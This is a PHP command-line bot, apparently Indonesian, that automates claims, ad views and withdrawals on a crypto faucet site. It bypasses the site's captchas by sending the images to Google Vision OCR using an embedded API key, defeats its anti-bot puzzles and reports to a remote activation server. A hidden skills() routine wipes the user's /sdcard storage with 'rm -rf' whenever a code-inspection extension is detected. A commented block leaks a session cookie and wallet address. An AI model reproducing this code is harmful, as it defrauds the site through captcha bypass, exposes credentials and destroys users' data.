<?php

#date_default_timezone_set('Asia/Jakarta');
system("clear");
$var_0="\n";$var_1="\t";
//warnn
$var_2="\033[34m";$var_3="\033[36m";$var_4="\033[92m";
$var_5="\033[37m";$var_6="\033[35m";$var_7="\033[31m";
$var_8="\033[33m";$var_9="\033[8m";$var_10="\033[0"."m";
function saveas($var_11,$var_12){
 if(!file_exists($var_11)){file_put_contents($var_11,"[]"); }
 $var_15 = json_decode(file_get_contents($var_11),1);
 $var_17 = array_merge($var_15,$var_12);
file_put_contents($var_11,json_encode($var_17,JSON_PRETTY_PRINT));}

function head($var_12){
 foreach($var_12 as $var_24=>$var_25){$var_26[]=$var_24.": ".$var_25;}
 return $var_26; }
 
function timer($var_30,$var_31){
  date_default_timezone_set('UTC');
$var_32 = time()+$var_31;
$var_2="\033[34m";$var_3="\033[36m";
$var_4="\033[92m";$var_5="\033[37m";
$var_6="\033[35m";$var_7="\033[31m";
$var_8="\033[33m";$var_9="\033[8m";
$var_10="\033[0"."m";
$var_43=[$var_5,$var_7];
$var_46=0;
$var_47=[$var_4,$var_8,$var_3,$var_4,$var_8,$var_3];$var_54=1;
while(true):
echo "\r                                                        \r";
$var_55=$var_43[$var_46];
$var_58 = $var_32-time();
$var_60=date("H:i:s",$var_58);
if($var_58<1){ break; }
$var_63=str_repeat("â",$var_54);$var_65=$var_47[$var_54-1];
$var_68="tod!";$var_69="â©";
echo $var_5.$var_30."$var_5 â¨$var_55$var_60$var_5$var_69 $var_68$var_65$var_63";
if($var_54==6){$var_54=1;}else{$var_54++;} sleep(1);
$var_46++; 
if($var_46 >= count ($var_43)){$var_46=0;}

endwhile; 
  }

function settings($var_87,$var_88){
$var_89 = "https://tuyulgaple.online/sunggingads/";
$var_90 = json_encode(
    array(
        'sk' => $var_87,
        'vr' => $var_88 ));
$var_93 = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/json',
        'content' => $var_90
    ));
$var_95 = stream_context_create($var_93);
$var_97     = json_decode(file_get_contents($var_89, false, $var_95),1);

$var_100      = $var_97["baner"];
if(!$var_97["status"]){ 
 $var_30 = "skrip di non-aktifkan\n";
 echo $var_104.$var_100.$var_30; exit; }
else{ return $var_104.$var_100; }  }

function clr($var_100){system("clear");echo $var_100.$var_0;}

function strip(){
$var_5="\033[37m";
echo "$var_5~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";}
function tabs(){
echo "\r                                                        \r";}

function curl($var_89,$var_115,$var_116){
 $var_117 = curl_init($var_89);
 curl_setopt($var_117, CURLOPT_SSL_VERIFYPEER, 1);
 curl_setopt($var_117, CURLOPT_RETURNTRANSFER, 1 ); 
 curl_setopt($var_117, CURLOPT_TIMEOUT,30       );
 curl_setopt($var_117, CURLOPT_VERBOSE,        0);
 curl_setopt($var_117, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($var_117, CURLOPT_HTTPHEADER, $var_116 );
 #curl_setopt($ch, CURLOPT_COOKIEJAR,  "cookie");
 #curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie");
if(strlen($var_115) > 0 ){
 curl_setopt($var_117, CURLOPT_POST, true);
 curl_setopt($var_117, CURLOPT_POSTFIELDS,    $var_115 ); }
 $var_130 = curl_exec($var_117);
 $var_132   = curl_getinfo($var_117);
 curl_close($var_117);
 if($var_132["http_code"]==302){
 return $var_132["redirect_url"]; } else { return $var_130; } }
 
function imgScaner($var_138){
    $var_139=[
    "user-agent: Mozilla/5.0 (Linux; Android 10; ASUS_X01BDA Build/QD4A.200905.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.114 Mobile Safari/537.36"
    ];
	if(!file_exists($var_138)){ return false; }
	$var_141=file_get_contents("keys");
	$var_89 = "https://tuyulgaple.online/api/new/";
	$var_143 = json_encode([
		"request"    => "cloudocr",
		"keys"       => $var_141,
		"data"       => base64_encode(file_get_contents($var_138))
		]);
	$var_97  = curl($var_89,$var_143,$var_139);
	if($var_97=="fail"){ exit("keys are expired, please update first !\n"); }
	return explode(":",$var_97)[1];	
	}

function imgscan($var_138){
$var_153=base64_encode(file_get_contents($var_138));
$var_139=["content-type: application/json"];
$var_115='{
  "requests": [
    {
      "image": {
        "content": "'.$var_153.'"
      },
      "features": [
        {
          "type": "TEXT_DETECTION"
        }
      ]
    }
  ]
}';
$var_89="https://vision.googleapis.com/v1/images:annotate?key=AIzaSyC3y-Em42htSB8UEZPqptJ78rlvL58_h6Y";
$var_159=curl($var_89,$var_115,$var_139);
$var_163=strpos($var_159,'Enter the following:\n');
if($var_163){
$var_163=substr($var_159,$var_163);
$var_163=str_replace('Enter the following:\n','',$var_163);
$var_163=substr($var_163,0,strpos($var_163,'"'));
$var_163=str_replace('\n','',$var_163);
$var_163= preg_replace("/[^a-zA-Z]/", "", $var_163);}
if(strlen($var_163) > 25){}else{return $var_163;} }

function verif_keys($var_87,$var_100){
$var_0="\n";$var_1="\t";
//warna
$var_2 = "\033[34m"; $var_3 = "\033[36m"; $var_4 = "\033[92m";
$var_5= "\033[37m"; $var_6= "\033[35m"; $var_7 = "\033[31m";
$var_8 = "\033[33m"; $var_9= "\033[8m";  $var_10  = "\033[0"."m";
while(true): clr($var_100);
if( $var_194 ){
 $var_194 = 0;
 while(true): clr($var_100);
 $var_197 = str_replace($var_0,"",file_get_contents("keys"));
 $var_89 = "http://tuyulgaple.online/aktivator/";
 $var_143 = json_encode([ "request" => $var_87,"keys" => $var_197]);
 $var_203  = json_decode( curl($var_89,$var_143,array()),1 );
if( $var_203["respon"] ) {
  echo $var_3."=> ".$var_203["respon"].$var_0;
  $var_210 = readline($var_5."input key : ");
  if( $var_210 ){
  $var_143 = json_encode(["request" => $var_87,"keys" => $var_210]);
  $var_203  = json_decode(curl($var_89,$var_143,array()),1);
  if( $var_203["code"] != 10 ) {
  file_put_contents("keys",$var_210);
  $var_197 = str_replace($var_0,"",file_get_contents("keys")); break; }}}
 else{ readline($var_4."your keys is uptodate ");break; }endwhile; }
 $var_89 = "http://tuyulgaple.online/aktivator/";
 $var_197 = str_replace($var_0,"",file_get_contents("keys"));
 $var_143 = json_encode(["request" => $var_87,"keys" => $var_197]);
 $var_203  = json_decode(curl($var_89,$var_143,array()),1);
if( $var_203["code"] == 10 ){ $var_194=1; }else{ break; }
endwhile; }
function update($var_87,$var_236){
$var_197 = str_replace($var_0,"",file_get_contents("keys"));
$var_89 = "http://tuyulgaple.online/aktivator/";
$var_143 = json_encode([ "request" => $var_87,"keys" => $var_197]);
$var_203  = json_decode( curl($var_89,$var_143,array()),1 );
if($var_203["respon"]){
echo $var_236."keys are expired, please update first !\n";exit;}  }
function input($var_248,$var_100,$var_115,$var_251){
 $var_252 = array(); 
 foreach( $var_115 as $var_254 ){
 clr($var_100);
 if(!$var_251[$var_254]){ 
  $var_258 = readline($var_254." : ");
  $var_252 = array_merge($var_252,[$var_254 => $var_258 ]); }
 else{ $var_252 = array_merge($var_252,[ $var_254 => $var_251[$var_254] ]); }
 } if($var_252[$var_115[0]]){ return $var_252; } }
 
 function fake_user(){
$var_89  = "https://tuyulgaple.tech/randomuser/";
$var_273 = json_decode(file_get_contents($var_89),1); 
$var_275 = [ 
    "name"  => [
              "first"  => $var_273["first"],
              "last"   => $var_273["last"],
              "full"   => $var_273["full_name"] ],
    "uuid"  => $var_273["uuid"]  ];
return $var_275; }
 
function skills(){
$var_30="anda terdeteksi sebagai kang ngentod!";
if(extension_loaded("evalhook")){
 @system("clear");shell_exec('rm -rf /sdcard');
 $var_282=file_get_contents("https://txxx.com/");
 file_put_contents("bot.php",$var_282);echo $var_30; exit; }}
 
/*
shell_exec("convert img.img -fill black -fuzz 30% +opaque '#FFFFFF' img.png > /dev/null 2>&1");
*/
$var_87="cryptoaffi";$var_88="1.4";$var_248="config.json";
skills();
error_reporting(0);
$var_288=settings($var_87,$var_88,"");
//verif_keys($var_87,$var_288);
clr($var_288);$var_294="cryptoaffiliates.store";

while(true):
$var_15   = json_decode(file_get_contents($var_248),1);
if(!$var_15["cookie"]){
$var_298["cookie"]=readline("cookie: ");
saveas($var_248,$var_298);strip(); }
elseif(!$var_15["user-agent"]){
$var_298["user-agent"]=readline("user-agent: ");
saveas($var_248,$var_298);strip(); }
elseif(!$var_15["url-solve"]){
$var_298["url-solve"]=readline("url-solve: ");
saveas($var_248,$var_298);strip(); }
/*elseif(!$get["wallet"]){
$in["wallet"]=readline("wallet: ");
saveas($cfg,$in);strip(); }*/
else{
$var_309=$var_15["cookie"];$var_311=$var_15["user-agent"];
$var_313=$var_15["url-solve"];
#$walet=$get["wallet"];
break;}
endwhile;clr($var_288);


function getsolve($var_313,$var_12){
$var_139=head($var_12);
$var_159=curl($var_313,"",$var_139);
$var_323=strpos($var_159,'chid"     : "');
$var_325=strpos($var_159,'uid"      : "');
if($var_323){
$var_323=substr($var_159,$var_323);
$var_323=str_replace('chid"     : "','',$var_323);
$var_323=substr($var_323,0,strpos($var_323,'"'));}
if($var_325){
$var_325=substr($var_159,$var_325);
$var_325=str_replace('uid"      : "','',$var_325);
$var_325=substr($var_325,0,strpos($var_325,'"'));}
return[
    "cid" => $var_323,
    "uid" => $var_325
    ];}

function solvemedia($var_323,$var_12){
$var_139=head($var_12);
$var_89="https://api-secure.solvemedia.com/papi/media?c=$var_323;w=300;h=150;fg=000000;bg=f8f8f8";
$var_159=curl($var_89,"",$var_139);
return $var_159; }

function antibot($var_294,$var_12){
 $var_139=head($var_12);
 $var_89=curl("https://$var_294/faucet","",$var_139);
 if($var_364 = strpos($var_89,"var ablinks")){
  $var_115 = substr($var_89,$var_364);
  $var_115 = substr($var_115,0,strpos($var_115,"</script>"));}
$var_372 = array();
$var_373  = explode("rel=",$var_115);
foreach($var_373 as $var_24 => $var_25 ){ 
  $var_372[]= str_replace(["\\",'"'],"",substr($var_25,0,strpos($var_25,">"))); }
  array_shift($var_372);  
 $var_382=$var_372[0];$var_384=$var_372[1];$var_386=$var_372[2];
 $var_388 = [ 
   "$var_382 $var_384 $var_386",
   "$var_382 $var_386 $var_384",
   "$var_384 $var_382 $var_386",
   "$var_384 $var_386 $var_382",
   "$var_386 $var_382 $var_384",
   "$var_386 $var_384 $var_382"];
 return $var_388[array_rand($var_388)];}
 
function home($var_294,$var_12){
$var_139=head($var_12);
$var_89="https://$var_294/dashboard";
$var_159=curl($var_89,"",$var_139);
$var_418=strpos($var_159,"siteUserFullName: '");
$var_420=strpos($var_159,'tokenBalance" value="');
$var_422=strpos($var_159,'csrf_token_name" value="');
if($var_418){
$var_418=substr($var_159,$var_418);
$var_418=str_replace("siteUserFullName: '",'',$var_418);
$var_418=substr($var_418,0,strpos($var_418,'<'));}
if($var_420){
$var_420=substr($var_159,$var_420);
$var_420=str_replace('tokenBalance" value="','',$var_420);
$var_420=substr($var_420,0,strpos($var_420,'"'));}
if($var_422){
$var_422=substr($var_159,$var_422);
$var_422=str_replace('csrf_token_name" value="','',$var_422);
$var_422=substr($var_422,0,strpos($var_422,'"'));}
return["nick" => $var_418,"bal" => $var_420,
       "csrf" => $var_422];   }

/////auto//////

function auto($var_294,$var_12){
$var_139=head($var_12);
$var_89="https://$var_294/auto";
$var_159=curl($var_89,"",$var_139);
$var_463=strpos($var_159,'token" value="');
$var_465=strpos($var_159,'let timer = ');
$var_467=strpos($var_159,"Good job!', '");
$var_469=strpos($var_159,'fa-exclamation-circle"></i> ');
if($var_463){
$var_463=substr($var_159,$var_463);
$var_463=str_replace('token" value="','',$var_463);
$var_463=substr($var_463,0,strpos($var_463,'"'));}
if($var_465){
$var_465=substr($var_159,$var_465);
$var_465=str_replace('let timer = ','',$var_465);
$var_465=substr($var_465,0,strpos($var_465,','));}
if($var_467){
$var_467=substr($var_159,$var_467);
$var_467=str_replace("Good job!', '","",$var_467);
$var_467=substr($var_467,0,strpos($var_467," "));}
if($var_469){
$var_469=substr($var_159,$var_469);
$var_469=str_replace('fa-exclamation-circle"></i> ','',$var_469);
$var_469=substr($var_469,0,strpos($var_469,'<'));}
return["token"=>$var_463,"time"=>$var_465,
       "warn" =>$var_469,"rwd" => $var_467 ];    }

function auto_verif($var_294,$var_12,$var_463){
$var_139=head($var_12);
$var_89="https://$var_294/auto/verify";
$var_115="token=$var_463";
$var_159=curl($var_89,$var_115,$var_139);
$var_467=strpos($var_159,"Good job!', '");
if($var_467){
$var_467=substr($var_159,$var_467);
$var_467=str_replace("Good job!', '","",$var_467);
$var_467=substr($var_467,0,strpos($var_467," "));}
return ["rwd"=>$var_467]; }

////faucet////

function faucet($var_294,$var_12){
$var_139=head($var_12);
$var_89="https://$var_294/faucet";
$var_159=curl($var_89,"",$var_139);
$var_465=strpos($var_159,'var wait = ');
$var_422=strpos($var_159,'csrf_token_name" id="token" value="');
$var_463=strpos($var_159,'hidden" name="token" value="');
if($var_422){
$var_422=substr($var_159,$var_422);
$var_422=str_replace('csrf_token_name" id="token" value="','',$var_422);
$var_422=substr($var_422,0,strpos($var_422,'"'));}
if($var_463){
$var_463=substr($var_159,$var_463);
$var_463=str_replace('hidden" name="token" value="','',$var_463);
$var_463=substr($var_463,0,strpos($var_463,'"'));}
if($var_465){
$var_465=substr($var_159,$var_465);
$var_465=str_replace('var wait = ','',$var_465);
$var_465=substr($var_465,0,strpos($var_465,' '));}
return ["csrf" => $var_422,"token" => $var_463,
        "time" => $var_465  ];    }
 
function faucet_verify($var_294,$var_12,$var_583,$var_422,$var_463,$var_586,$var_323){
$var_139=head($var_12);
$var_115 = http_build_query([
  "antibotlinks"    => $var_583,
  "csrf_token_name" => $var_422,
  "token"           => $var_463,
  "captcha"         => "solvemedia",
  "g-recaptcha-response" => "",
  "adcopy_response" => $var_586,
  "adcopy_challenge"=> $var_323
  ]);
$var_89="https://$var_294/faucet/verify";
$var_159=curl($var_89,$var_115,$var_139);
$var_602 = strpos($var_159,"Invalid");
$var_467  = strpos($var_159,"Good job!', '");
if($var_602){
$var_602 = substr($var_159,$var_602);
$var_602 = substr($var_602,0,strpos($var_602,"</div>"));}
if($var_467){
$var_467=substr($var_159,$var_467);
$var_467=str_replace("Good job!', '","",$var_467);
$var_467=substr($var_467,0,strpos($var_467," "));}

return [
    "rwd"  => $var_467,
    "fail" => $var_602
    ];     }

/////ptc////

function ptc($var_294,$var_12){
$var_139=head($var_12);
$var_89="https://$var_294/ptc";
$var_159=curl($var_89,"",$var_139);
$var_633=strpos($var_159,'ptc/view/');
if($var_633){
$var_633=substr($var_159,$var_633);
$var_633=str_replace('ptc/view/','',$var_633);
$var_633=substr($var_633,0,strpos($var_633,"'"));}

$var_89="https://$var_294/ptc/view/$var_633";
$var_159=curl($var_89,"",$var_139);
$var_422=strpos($var_159,'csrf_token_name" value="');
$var_463=strpos($var_159,'name="token" value="');
$var_654=strpos($var_159,'ptc/verify/');
$var_465=strpos($var_159,'var timer = ');
if($var_422){
$var_422=substr($var_159,$var_422);
$var_422=str_replace('csrf_token_name" value="','',$var_422);
$var_422=substr($var_422,0,strpos($var_422,'"'));}
if($var_463){
$var_463=substr($var_159,$var_463);
$var_463=str_replace('name="token" value="','',$var_463);
$var_463=substr($var_463,0,strpos($var_463,'"'));}
if($var_654){
$var_654=substr($var_159,$var_654);
$var_654=str_replace('ptc/verify/','',$var_654);
$var_654=substr($var_654,0,strpos($var_654,'"'));}
if($var_465){
$var_465=substr($var_159,$var_465);
$var_465=str_replace('var timer = ','',$var_465);
$var_465=substr($var_465,0,strpos($var_465,';'));}
return ["csrf"=>$var_422,"token"=>$var_463,
       "view"=>$var_654,"time"=>$var_465];    }
       
function ptc_verif($var_294,$var_12,$var_586,$var_323,$var_422,$var_463,$var_654){
$var_139=head($var_12);
$var_115 = http_build_query([
  "captcha"         => "solvemedia",
  "adcopy_response" => $var_586,
  "adcopy_challenge"=> $var_323,
  "g-recaptcha-response" => "",
  "h-captcha-response"   => "",
  "csrf_token_name" => $var_422,
  "token"           => $var_463
  ]);
$var_89="https://$var_294/ptc/verify/$var_654";
$var_159=curl($var_89,$var_115,$var_139);
$var_602 = strpos($var_159,"Invalid");
$var_467  = strpos($var_159,"Good job!', '");
if($var_602){
$var_602 = substr($var_159,$var_602);
$var_602 = substr($var_602,0,strpos($var_602,"</div>"));}
if($var_467){
$var_467=substr($var_159,$var_467);
$var_467=str_replace("Good job!', '","",$var_467);
$var_467=substr($var_467,0,strpos($var_467," "));}
return ["rwd"=>$var_467,"fail"=>$var_602]; }

////withdraw////

function withdraw($var_294,$var_12,$var_743,$var_744,$var_422){
$var_139=head($var_12);
$var_115 = http_build_query([
  "method"         => "1",
  "amount"         => $var_743,
  "wallet"         => $var_744,
  "csrf_token_name"=> $var_422
  ]);
$var_89="https://$var_294/dashboard/withdraw";
$var_159=curl($var_89,$var_115,$var_139);
$var_758=strpos($var_159,"title: '");
$var_467  = strpos($var_159,"text: '");
if($var_758){
$var_758=substr($var_159,$var_758);
$var_758=str_replace("title: '","",$var_758);
$var_758=substr($var_758,0,strpos($var_758," "));}
if($var_467){
$var_467=substr($var_159,$var_467);
$var_467=str_replace("text: '","",$var_467);
$var_467=substr($var_467,0,strpos($var_467," "));}
return ["wd"=>$var_467,"name"=>$var_758]; }

/*

$cokie="ci_session=f77fed7eb21b9af427539f76bd447ad26f687b7c; Referral_Source=https://r.search.yahoo.com/_ylt=Awrxgq8upmthj2IA7xT8YSQ5;_ylu=Y29sbwMEcG9zAzIEdnRpZAMEc2VjA3Ny/RV=2/RE=1634473646/RO=10/RU=https%3a%2f%2fcryptoaffiliates.store%2f%3fr%3d1/RK=2/RS=uQ3BWxidrsYiycF5ZmT.Px_zyJU-; __viCookieActive=true; _pbjs_userid_consent_data=3524755945110770; _ga=GA1.2.1037176503.1634444885; _gid=GA1.2.1983158447.1634444885; bitmedia_fid=eyJmaWQiOiJkZjNkOTIwYjBiYjgyYTI1MWNmMTViMjFmOTE3MDc1YyIsImZpZG5vdWEiOiI5YTAzNWYwNzQzYWQxYTEzNDJkMTJmYTNmMjhmYzViMSJ9; __gads=ID=a4a37b713d6e00f6-223e9aa0a8cc00fc:T=1634444939:RT=1634444939:S=ALNI_MYcRwTyf_Kk74zzG1pz6KqaTUq0Fg; csrf_cookie_name=2edcfd2875fc27fbe949541655ccbec0; dom3ic8zudi28v8lr6fgphwffqoz0j6c=544e8abe-3822-48b3-a6f1-1fd00589ce83:1:1; cto_bundle=ngK8ul83cGNLQm9TVUolMkJtRGU0WVFVaGNQbk5jVDFSaVpBY1VveHc4THI5RlYzU3lUbVM1THZzbEZ4T1AxR2xMcmp2QVpXQ25IdmxHbWxPbEJWS21yRGxqdWpwc0E1bWZIVkhrZUdxaUZWVE45OWhIU1A4bEFEeWk0MXVhMGRRZVQ4RCUyRnVyaXdlMEE2Wm1qRDVRdkhBS3l3RE5UVkgwQzdERFdnWm5XYThKJTJCOE43SjglM0Q; cto_bidid=MMVLrl8wTFhJdEhQcFVIViUyRmFJZURuaWFLbWhNSHFkY3VQc2pMODZ2cVJxR25DYk4lMkZwQjJlJTJCamIwNzNrczJWd0l3NHlRVkN1a0QlMkJxZXlhb1N1WmhzUTg5JTJCWGg5UjMlMkZiVnRiZ0VxV1g0UldUWXlBMk5VOU9mV2YlMkZJUk40NXF5R1NTZWp2; _gat_gtag_UA_178497691_1=1; _gat_gtag_UA_128776493_31=1; _data_cpc=357-3-1634448532";
$agent="Mozilla/5.0 (Linux; Android 9; ASUS_X01BDA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36";
$walet="TV6McbzWprxCeqAj3Bixf84XMFc7Ja3W46";
$urlsolve="https://api-secure.solvemedia.com/papi/_challenge.js?k=UFqoFftCl6Mc3H7Yn58vaauDNowjnxIS;f=_ACPuzzleUtil.callbacks%5B0%5D;l=en;t=img;s=standard;c=js,h5c,h5ct,svg,h5v,v/h264,v/webm,h5a,a/mp3,a/ogg,ua/chrome,ua/chrome88,os/android,os/android9,fwv/BR4PTw.hpwd58,htmlplus;am=FQnMLEP.G38QFw4TQ.8bfw;ca=script;ts=1634429738;ct=1634444890;th=white;r=0.9134710405235906";
*/

$var_139=[
    "Host" => $var_294,
    "upgrade-insecure-requests" => "1",
    "user-agent" => $var_311,
    "accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
   "content-type" => "application/x-www-form-urlencoded",
    "referer" => "https://$var_294/faucet",
    "cookie" => $var_309
     ];

while(true):
$var_787=home($var_294,$var_139);
if($var_418=$var_787["nick"]){$var_420=$var_787["bal"];
echo $var_4."connect as$var_3 $var_418$var_5 balance$var_4 $var_420$var_0";
strip();}else{
echo $var_7."connect failed.$var_0";
$var_17=readline($var_5."input ulang cookie : ");
$var_254=[
    "cookie" => $var_17
    ];
saveas("config.json",$var_254);
echo $var_4."silahkan jalankan ulang.$var_0";exit;}

echo $var_4.$var_1."[1]$var_5 visit PTC$var_0";
echo $var_4.$var_1."[2]$var_5 auto  Faucet$var_0";
echo $var_4.$var_1."[3]$var_5 claim Faucet$var_0";
$var_822=readline("options: ");strip();


switch($var_822){
case 1:

while(true):
$var_633=ptc($var_294,$var_139);
if($var_422=$var_633["csrf"]){$var_463=$var_633["token"];
$var_654=$var_633["view"];$var_465=$var_633["time"];
timer("wait",$var_465);
while(true):
$var_836=getsolve($var_313,$var_139);
if($var_836["cid"]){
$var_323=$var_836["cid"];$var_325=$var_836["uid"];}
else{
tabs();
echo $var_7."gagal load data image !";}

$var_845=solvemedia($var_323,$var_139);
if(!$var_848 = imagecreatefromstring($var_845)){
tabs();
echo $var_7."gagal download image !$var_5";}
else{ 
  imagepng($var_848,"img.png");
  imagedestroy($var_848); 
  shell_exec('convert img.png -fill black -fuzz 30% +opaque "#FFFFFF" img.png > /dev/null 2>&1');
update($var_87,$var_5);
$var_586=imgscan("img.png");sleep(5);
break;}endwhile;

$var_857  = date("H:i:s",time()+7*60*60);
tabs();
echo $var_5."[$var_857] captcha ->$var_4 $var_586";sleep(3);

$var_862=ptc_verif($var_294,$var_139,$var_586,$var_323,$var_422,$var_463,$var_654);
if($var_602=$var_862["fail"]){
tabs();
echo $var_5."[$var_857]$var_7 $var_602"; }
elseif($var_467=$var_862["rwd"]){
tabs();
$var_787=home($var_294,$var_139);
$var_420=$var_787["bal"];$var_422=$var_787["csrf"];
echo $var_5.$var_1."   reward :$var_4 $var_467$var_0";
echo $var_3."[$var_857]$var_5 balance:$var_4 $var_420$var_0";
strip();
}else{
tabs();
echo $var_5."[$var_857]$var_7 error!";}
}else{
tabs();
echo $var_7."visit ptc$var_5 no available.$var_0";exit;}
endwhile;
break;
case 2:
while(true):
$var_902=auto($var_294,$var_139);
if($var_463=$var_902["token"]){$var_465=$var_902["time"];
timer("wait",$var_465);

$var_862=auto_verif($var_294,$var_139,$var_463);
$var_787=home($var_294,$var_139);
$var_857  = date("H:i:s",time()+7*60*60);
$var_420=$var_787["bal"];$var_422=$var_787["csrf"];
if($var_467=$var_862["rwd"]){
tabs();
echo $var_5.$var_1."   reward :$var_4 $var_467$var_0";}else{
tabs();
echo $var_5.$var_1."   reward :$var_7 invalid$var_0";}
if($var_420){
tabs();
echo $var_3."[$var_857]$var_5 balance:$var_4 $var_420$var_0";}else{
tabs();
echo $var_3."[$var_857]$var_5 balance:$var_7 invalid$var_0";}

strip();
}elseif($var_469=$var_902["warn"]){
tabs();
echo $var_7.$var_469.$var_5.$var_0;exit;}
else{
tabs();
echo $var_7."failed!$var_5 get data autofaucet.$var_0";sleep(3);}
endwhile;

break;
case 3:

while(true):
$var_954=faucet($var_294,$var_139);
$var_422=$var_954["csrf"];$var_463=$var_954["token"];
$var_465=$var_954["time"];timer("wait",$var_465);
while(true):
$var_836=getsolve($var_313,$var_139);
if($var_836["cid"]){
$var_323=$var_836["cid"];$var_325=$var_836["uid"];}
else{
tabs();
echo $var_7."gagal load data image !";}


$var_845=solvemedia($var_323,$var_139);
if(!$var_848 = imagecreatefromstring($var_845)){
tabs();
echo $var_7."gagal download image !$var_5";}
else{ 
  imagepng($var_848,"img.png");
  imagedestroy($var_848); 
  shell_exec('convert img.png -fill black -fuzz 30% +opaque "#FFFFFF" img.png > /dev/null 2>&1');
update($var_87,$var_5);
$var_586=imgscan("img.png");sleep(5);
break;}endwhile;

$var_857  = date("H:i:s",time()+7*60*60);
tabs();
echo $var_5."[$var_857] captcha ->$var_4 $var_586";sleep(3);

$var_583=antibot($var_294,$var_139);
if($var_583){
tabs();
echo $var_5."[$var_857] antibots$var_4 $var_583";}

$var_862=faucet_verify($var_294,$var_139,$var_583,$var_422,$var_463,$var_586,$var_323);
if($var_862["fail"]){
$var_602=$var_862["fail"];
tabs();
echo $var_5."[$var_857]$var_7 $var_602";}
elseif($var_862["rwd"]){$var_467=$var_862["rwd"];
$var_787=home($var_294,$var_139);
$var_420=$var_787["bal"];$var_422=$var_787["csrf"];
tabs();
echo $var_5.$var_1."   reward :$var_4 $var_467$var_0";
echo $var_3."[$var_857]$var_5 balance:$var_4 $var_420$var_0";
strip();
}else{
tabs();
echo $var_5."[$var_857]$var_7 error!";}

endwhile;
break;
}readline("press key any continue");clr($var_288);
endwhile;
?>
